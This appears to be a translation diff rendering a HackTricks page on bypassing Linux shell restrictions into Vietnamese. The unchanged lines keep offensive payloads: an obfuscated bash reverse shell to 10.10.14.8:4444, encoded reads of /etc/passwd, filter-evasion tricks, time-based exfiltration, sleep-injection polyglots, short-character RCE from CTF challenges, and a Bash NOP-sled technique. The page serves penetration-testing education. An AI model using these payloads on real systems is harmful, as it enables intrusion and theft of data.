@@ -1,12 +1,12 @@
-# Bypass Linux Restrictions
+# Vượt qua các hạn chế của Linux
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Common Limitations Bypasses
+## Các cách vượt qua hạn chế phổ biến
 
-The command-injection and WAF-evasion collections in PayloadsAllTheThings, Bo0oM's cheat sheet, and the two linked Secjuice articles provide background for the shell-syntax variations in this section.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+Các bộ sưu tập về command-injection và WAF-evasion trong PayloadsAllTheThings, cheat sheet của Bo0oM và hai bài viết Secjuice được liên kết cung cấp thông tin nền tảng về các biến thể cú pháp shell trong phần này.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
-For identifying a shell sink and confirming blind execution, see [Command Injection](../../../pentesting-web/command-injection.md).
+Để xác định shell sink và xác nhận việc thực thi mù, hãy xem [Command Injection](../../../pentesting-web/command-injection.md).
 
 ### Reverse Shell
 
@@ -16,7 +16,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
 
-### Short Rev shell
+### Rev shell ngắn
 
 ```bash
 #Trick from Dikline
@@ -26,7 +26,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 exec >&0
 ```
 
-### Bypass Paths and forbidden words
+### Bypass Paths và các từ bị cấm
 
 ```bash
 # Question mark binary substitution
@@ -88,7 +88,7 @@ whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
 
-### Bypass forbidden spaces
+### Bypass các khoảng trắng bị cấm
 
 ```bash
 # {form}
@@ -117,7 +117,7 @@ $u $u # This will be saved in the history and can be used as a space, please not
 uname!-1\-a # This equals to uname -a
 ```
 
-### Bypass backslash and slash
+### Bypass backslash và slash
 
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
@@ -130,7 +130,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 
-### Bypass with hex encoding
+### Bypass bằng mã hóa hex
 
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
@@ -142,13 +142,13 @@ xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
 
-### Letter-free command names with octal quoting
+### Tên lệnh không chứa chữ cái bằng cách trích dẫn octal
 
-Bash's ANSI-C `$'...'` quoting decodes octal escapes when constructing a command word.<sup>[[7]](#references)</sup>
+Cách trích dẫn ANSI-C `$'...'` của Bash giải mã các escape octal khi tạo một từ lệnh.<sup>[[7]](#references)</sup>
 
-A letter-denylist can therefore fail if it still permits `$`, single quotes, backslashes, digits, and a command separator. This does not bypass input passed as a correctly quoted data argument.<sup>[[13]](#references)</sup>
+Vì vậy, danh sách chặn chữ cái có thể bị vô hiệu nếu vẫn cho phép `$`, dấu nháy đơn, dấu gạch chéo ngược, chữ số và dấu phân cách lệnh. Cách này không bypass dữ liệu đầu vào được truyền dưới dạng đối số dữ liệu có trích dẫn đúng cách.<sup>[[13]](#references)</sup>
 
-In this local test, `:` stands in for the preceding command and `\151\144` decodes to `id`.<sup>[[7]](#references)</sup> Arguments can be encoded as separate words when a word separator is available.<sup>[[13]](#references)</sup>
+Trong thử nghiệm cục bộ này, `:` đại diện cho lệnh đứng trước, còn `\151\144` được giải mã thành `id`.<sup>[[7]](#references)</sup> Có thể mã hóa các đối số thành những từ riêng biệt khi có dấu phân cách từ.<sup>[[13]](#references)</sup>
 
 ```bash
 :;$'\151\144'
@@ -161,13 +161,13 @@ In this local test, `:` stands in for the preceding command and `\151\144` decod
 127.0.0.1 == 2130706433
 ```
 
-### Time based data exfiltration
+### Exfiltration dữ liệu dựa trên thời gian
 
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
 
-### Getting chars from Env Variables
+### Lấy ký tự từ biến môi trường
 
 ```bash
 echo ${LS_COLORS:10:1} #;
@@ -176,12 +176,12 @@ echo ${PATH:0:1} #/
 
 ### DNS data exfiltration
 
-For out-of-band callbacks, a collaborator-style service such as Burp Collaborator can induce a target application to interact with an external server; the existing [**pingb**](http://pingb.in) link is retained as historical navigation, not a current availability claim.<sup>[[6]](#references)</sup>
+Đối với callback ngoài băng, một dịch vụ kiểu Collaborator như Burp Collaborator có thể khiến ứng dụng mục tiêu tương tác với máy chủ bên ngoài; liên kết [**pingb**](http://pingb.in) hiện có được giữ lại để tham khảo lịch sử, không phải để khẳng định dịch vụ hiện còn hoạt động.<sup>[[6]](#references)</sup>
 
 ### Builtins
 
-In a restricted shell, the available builtins are the remaining command surface for these examples; Bash documents its builtin commands and execution grammar.<sup>[[7]](#references)</sup> Idea from [**devploit**](https://twitter.com/devploit).\
-Start with the existing [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) navigation, then try the following Bash-specific techniques:<sup>[[7]](#references)</sup>
+Trong shell bị hạn chế, các builtin còn khả dụng là những lệnh duy nhất có thể dùng trong các ví dụ này; tài liệu Bash mô tả các lệnh builtin và cú pháp thực thi của chúng.<sup>[[7]](#references)</sup> Ý tưởng từ [**devploit**](https://twitter.com/devploit).\
+Bắt đầu với liên kết tham khảo hiện có về [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html), sau đó thử các kỹ thuật dành riêng cho Bash sau đây:<sup>[[7]](#references)</sup>
 
 ```bash
 # Get list of builtins
@@ -242,7 +242,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
 
-### Bypass potential regexes
+### Các regex tiềm năng để bypass
 
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
@@ -251,16 +251,16 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 
 ### Bashfuscator
 
-The following invocation uses Bashfuscator, an open-source Bash obfuscation framework; the repository link in the code comment is retained as navigation.<sup>[[8]](#references)</sup>
+Lệnh gọi sau sử dụng Bashfuscator, một framework mã nguồn mở để làm rối mã Bash; liên kết đến repository trong chú thích mã được giữ lại để tiện điều hướng.<sup>[[8]](#references)</sup>
 
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
 
-### RCE with 5 chars
+### RCE với 5 ký tự
 
-The following two historical 5-character examples are retained as challenge reproductions: the primary challenge repository is available at [Orange Tsai’s repository](https://github.com/orangetw/My-CTF-Web-Challenges), while the second write-up link in the code block is navigation whose current availability was not verified.<sup>[[9]](#references)</sup>
+Hai ví dụ lịch sử dài 5 ký tự sau được giữ lại dưới dạng tái hiện thử thách: kho lưu trữ thử thách chính có tại [kho lưu trữ của Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), trong khi liên kết write-up thứ hai trong khối mã là liên kết điều hướng mà tính khả dụng hiện tại chưa được xác minh.<sup>[[9]](#references)</sup>
 
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
@@ -309,7 +309,7 @@ ln /f*
 ## to it in the current folder
 ```
 
-### RCE with 4 chars
+### RCE với 4 ký tự
 
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
@@ -346,25 +346,25 @@ ln /f*
 'sh g'
 ```
 
-## Read-Only/Noexec/Distroless Bypass
+## Bypass Read-Only/Noexec/Distroless
 
-If you are inside a filesystem with **read-only and noexec protections**, or in a **distroless image**, the environment imposes execution constraints documented by Linux `mount(8)` and the Distroless project; the linked page collects techniques for working within them.<sup>[[11]](#references)[[12]](#references)</sup>
+Nếu bạn đang ở trong một filesystem có **các biện pháp bảo vệ read-only và noexec**, hoặc trong một **image Distroless**, môi trường sẽ áp đặt các hạn chế thực thi được tài liệu `mount(8)` của Linux và dự án Distroless ghi lại; trang được liên kết tổng hợp các kỹ thuật để xử lý những hạn chế này.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & other Jails Bypass
+## Bypass Chroot & các Jail khác
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
-## Space-Based Bash NOP Sled ("Bashsledding")
+## NOP Sled Dựa trên Khoảng trắng của Bash ("Bashsledding")
 
-When a vulnerability lets you partially control an argument that ultimately reaches `system()` or another shell, the payload offset may be uncertain. Alan Cao and Will Tan describe a constrained embedded-device case where a shell payload was sprayed into memory-mapped NVRAM and prefixed with spaces.<sup>[[5]](#references)</sup>
+Khi một lỗ hổng cho phép bạn kiểm soát một phần một đối số mà cuối cùng được truyền đến `system()` hoặc một shell khác, vị trí của payload có thể không xác định. Alan Cao và Will Tan mô tả một trường hợp trên thiết bị nhúng bị giới hạn, trong đó payload shell được rải vào vùng NVRAM được ánh xạ bộ nhớ và thêm các dấu cách ở phía trước.<sup>[[5]](#references)</sup>
 
-Therefore you can create a *NOP sled for Bash* by prefixing your real command with a long sequence of spaces or tab characters; Bash defines spaces and tabs as blanks that separate words in a simple command.<sup>[[5]](#references)[[7]](#references)</sup>
+Do đó, bạn có thể tạo một *NOP sled cho Bash* bằng cách thêm một chuỗi dài dấu cách hoặc ký tự tab trước lệnh thực sự; Bash định nghĩa dấu cách và tab là các ký tự trắng dùng để phân tách từ trong một lệnh đơn giản.<sup>[[5]](#references)[[7]](#references)</sup>
 
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
@@ -372,31 +372,31 @@ Therefore you can create a *NOP sled for Bash* by prefixing your real command wi
 # 16× spaces ───┘ ↑ real command
 ```
 
-If a ROP chain (or another memory-corruption primitive) passes a command-string pointer that begins anywhere within the space block, Bash can parse the remaining leading blanks until it reaches the command; in the cited router exploit, this made uncertain string offsets usable.<sup>[[5]](#references)[[7]](#references)</sup>
+Nếu một ROP chain (hoặc primitive làm hỏng bộ nhớ khác) truyền vào một con trỏ đến chuỗi lệnh bắt đầu ở bất kỳ vị trí nào trong khối khoảng trắng, Bash có thể phân tích các khoảng trắng đứng đầu còn lại cho đến khi gặp lệnh; trong router exploit được trích dẫn, điều này giúp sử dụng được các độ lệch chuỗi không chắc chắn.<sup>[[5]](#references)[[7]](#references)</sup>
 
-Practical use cases in constrained embedded targets include:<sup>[[5]](#references)</sup>
+Các trường hợp sử dụng thực tế trên những thiết bị nhúng bị hạn chế bao gồm:<sup>[[5]](#references)</sup>
 
-1. **Memory-mapped configuration blobs** (e.g. NVRAM) that are accessible across processes.<sup>[[5]](#references)</sup>
-2. Payload channels where the attacker cannot write NULL bytes to align the payload (a general adaptation of the alignment problem).<sup>[[5]](#references)</sup>
-3. Embedded devices with a small BusyBox `ash`/`sh` environment, which BusyBox documents as applets in resource-constrained systems.<sup>[[10]](#references)</sup>
+1. **Các blob cấu hình được ánh xạ bộ nhớ** (ví dụ: NVRAM) có thể truy cập giữa các tiến trình.<sup>[[5]](#references)</sup>
+2. Các kênh payload mà attacker không thể ghi byte NULL để căn chỉnh payload (một cách áp dụng tổng quát cho vấn đề căn chỉnh).<sup>[[5]](#references)</sup>
+3. Các thiết bị nhúng có môi trường BusyBox `ash`/`sh` nhỏ gọn; BusyBox mô tả chúng là các applet dành cho hệ thống bị giới hạn tài nguyên.<sup>[[10]](#references)</sup>
 
-> 🛠️  Combine this technique with ROP gadgets that call `system()` in a controlled lab; the cited router research demonstrates this combination on constrained hardware.<sup>[[5]](#references)</sup>
+> 🛠️  Kết hợp kỹ thuật này với các ROP gadget gọi `system()` trong môi trường lab được kiểm soát; nghiên cứu về router được trích dẫn minh họa sự kết hợp này trên phần cứng bị giới hạn.<sup>[[5]](#references)</sup>
 
 
 
 ## References
 
-- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Alan Cao and Will Tan — Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Chèn lệnh](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - Tài liệu tham khảo về cách vượt qua WAF](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Kỹ thuật né tránh Web Application Firewall (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Kỹ thuật né tránh Web Application Firewall (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Alan Cao và Will Tan — Khai thác zero-day trên phần cứng bị bỏ hoang – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
-- [7] [bash(1) — Linux manual page](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [7] [bash(1) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
-- [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
+- [9] [Thử thách CTF web của tôi — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
 - [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
-- [11] [mount(8) — Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [11] [mount(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
 - [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
-- [13] [Dojo CTF #36: Shell Escape writeup — YesWeHack](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-36)
+- [13] [Dojo CTF #36: Bài giải Shell Escape — YesWeHack](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-36)
 {{#include ../../../banners/hacktricks-training.md}}
